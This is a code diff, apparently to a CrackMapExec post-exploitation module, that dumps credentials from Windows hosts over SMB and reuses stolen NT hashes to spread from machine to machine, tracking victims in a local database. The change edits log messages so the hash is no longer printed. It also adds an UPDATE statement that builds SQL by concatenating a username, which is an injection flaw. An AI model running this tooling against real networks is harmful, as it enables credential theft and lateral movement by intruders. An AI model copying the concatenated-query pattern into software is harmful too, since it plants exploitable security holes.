@@ -166,7 +166,8 @@ class CMEModule:
             domain=domain_name
         )
         if session.smb_session is None:
-            context.log.error("Couldn't connect to remote host")
+            context.log.error("Couldn't connect to remote host. Password likely expired/changed. Removing from DB.")
+            cursor.execute("UPDATE admin_users SET hash = NULL WHERE username LIKE '" + username + "'")
             return False
         dumper = Dumper(session, timeout=10).load(self.method)
         if dumper is None:
@@ -203,7 +204,7 @@ class CMEModule:
                     cursor.execute(f"SELECT * FROM pc_and_admins WHERE pc_name = '{pc[0]}' AND dumped NOT LIKE 'TRUE'")
                     more_to_dump = cursor.fetchall()
                     if len(more_to_dump) > 0:
-                        context.log.info(f"User {user[0]} has more access to {pc[0]}. Dumping with hash {user[1]}")
+                        context.log.info(f"User {user[0]} has more access to {pc[0]}. Attempting to dump.")
                         setattr(connection, "host", pc[0].split('.')[0])
                         setattr(connection, "username", user[0].split('@')[0])
                         setattr(connection, "nthash", user[1])
